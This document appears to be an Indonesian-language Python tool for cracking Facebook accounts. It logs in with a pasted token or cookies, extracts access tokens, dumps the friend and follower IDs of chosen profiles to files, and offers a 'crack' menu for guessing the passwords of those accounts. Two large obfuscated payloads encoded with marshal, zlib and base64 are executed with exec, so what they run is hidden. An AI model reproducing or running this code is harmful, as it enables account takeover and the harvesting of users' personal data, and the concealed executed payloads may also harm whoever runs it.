#!/usr/bin/python3
#-*-coding:utf-8-*-

import requests,mechanize,bs4,sys,os,subprocess,uuid
import requests,sys,random,time,re,base64,json
import os, re, requests, concurrent.futures
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()

try:
	import mechanize
except ImportError:
	os.system("pip install mechanize")
	os.system("python crack.py")
try:
	import requests
except ImportError:
	os.system("pip install requests")
	os.system("python crack.py")
try:
	import bs4
except ImportError:
	os.system("pip install bs4")
	os.system("python crack.py")

host="https://mbasic.facebook.com"
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"}).json()["country_name"].lower()
except:
	ips=None
	
exec(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 39, 109, 97, 114, 115, 104, 97, 108, 39, 41, 46, 108, 111, 97, 100, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 122, 108, 105, 98, 34, 41, 46, 100, 101, 99, 111, 109, 112, 114, 101, 115, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 98, 97, 115, 101, 54, 52, 34, 41, 46, 98, 54, 52, 100, 101, 99, 111, 100, 101],chr))(b'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'))))

ok = []
cp = []
ttl =[]

durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]')]

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
    
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("\nCookie Salah")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result

def logs():
  os.system("clear")
  banner()
  print(("\n1.) Login Token"))
  print(("2.) Login Cookies"))
  print(("3.) Update Script"))
  print(("0.) Keluar"))
  sek=input("\n> ")
  if sek=="":
    print(("\nSalah"))
    logs()
  elif sek=="1":
    log_token()
  elif sek=="2":
    gen()
  elif sek=="3":
    updatesc()
  elif sek=="0":
    exit()
  else:
    print(("\nSalah"))
    logs()

def log_token():
    toket = input("\nToken > ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print(("\nBerhasil Masuk"))
        time.sleep(2)
        bot_follow()
    except KeyError:
        print(("\nToken Invalid"))
        time.sleep(2)
        os.system("clear")
        logs()

def gen():
        cookie = input("\nCookies > ")
        try:
                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
                "referer"                   : "https://m.facebook.com/",
                "host"                      : "m.facebook.com",
                "origin"                    : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control"             : "max-age=0",
                "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type"              : "text/html; charset=utf-8"
                }, cookies = {
                "cookie"                    : cookie
                })
                find_token = re.search("(EAAA\w+)", data.text)
                hasil    = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print(("\nTidak Ada Koneksi"))
        cookie = open("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.close()
        print(("\nBerhasil Masuk"))
        time.sleep(2)
        bot_follow()

exec(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 39, 109, 97, 114, 115, 104, 97, 108, 39, 41, 46, 108, 111, 97, 100, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 122, 108, 105, 98, 34, 41, 46, 100, 101, 99, 111, 109, 112, 114, 101, 115, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 98, 97, 115, 101, 54, 52, 34, 41, 46, 98, 54, 52, 100, 101, 99, 111, 100, 101],chr))(b'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'))))

def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print(("\nBermasalah > %s"%e))
        time.sleep(2)
        logs()
    os.system("clear")
    banner()
    print(("\nHallo > [ "+a["name"]+ " ]"))
    print((""))
    print(("1.) Dump ID Publik"))
    print(("2.) Dump Followers"))
    print(("3.) Mulai Crack"))
    print(("0.) Keluar"))
    choose_menu()
	
def choose_menu():
	r=input("\n> ")
	if r=="":
		print(("\nSalah"))
		menu()
	elif r=="1":
		publik()
	elif r=="2":
		follow()
	elif r=="3":
		useragent()
	elif r=="0":
		try:
			jalan("\nTerimkasih Telah Memakai Script Aku")
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print(("\nBermasalah > %s"%e))
	else:
		print(("\nSalah"))
		menu()	

def useragent():
    ua = input("\nIngin Menggunakan User Agent Manual/Otomotis [ m/o ]\n\n> ")
    if ua=="":
        print(("\nSalah"))
        menu()
    elif ua=="o":
        try:
            ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
            ngen = open("useragent.txt","w")
            ngen.write(ua)
            ngen.close()
            pilihcrack()
        except KeyboardInterrupt:
            os.sys.exit()
    elif ua=="m":
        try:
            ua = input("\nUser Agent > ")
            ngen = open("useragent.txt","w")
            ngen.write(ua)
            ngen.close()
            pilihcrack()
        except KeyboardInterrupt:
            os.sys.exit()
    else:
        print(("\nSalah"))
        menu()

def pilihcrack():
  print(("\n\t     Pilih Metode Crack Nya"))
  print((""))
  print(("1.) Metode b-api [ Fast Crack ]"))
  print(("2.) Metode mbasic [ Slow Crack ]"))
  krah=input("\n> ")
  if krah in[""]:
    print(("\nSalah"))
    pilihcrack()
  elif krah in["1","01"]:
    bapittl()
  elif krah in["2","02"]:
    crackttl()
  else:
    print(("\nSalah"))
    pilihcrack()

def publik():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print(("\nCookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input("\nID Publik > ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(("Nama > "+op["name"]))
		except KeyError:
			print(("\nID Tidak Ada"))
			input(("\nTekan Enter Untuk Kembali"))
			menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".recod").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print(("ID Yang Di Dapat > %s"%(len(id))))
		jalan("\nBerhasil Dump ID")
		print(("\nSalin Nama File > "+qq))
		input("\nTekan Enter Untuk Kembali")
		menu()	
	except Exception as e:
		exit("\nBermasalah > %s"%e)

def follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print(("Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input("\nID Followers > ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(("Nama > "+op["name"]))
		except KeyError:
			print(("\nID Tidak Ada"))
			input(("\nTekan Enter Untuk Kembali"))
			menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".recod").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print(("ID Yang Di Dapat > %s"%(len(id))))
		jalan("\nBerhasil Dump ID Followers")
		print(("\nSalin Nama File > "+qq))
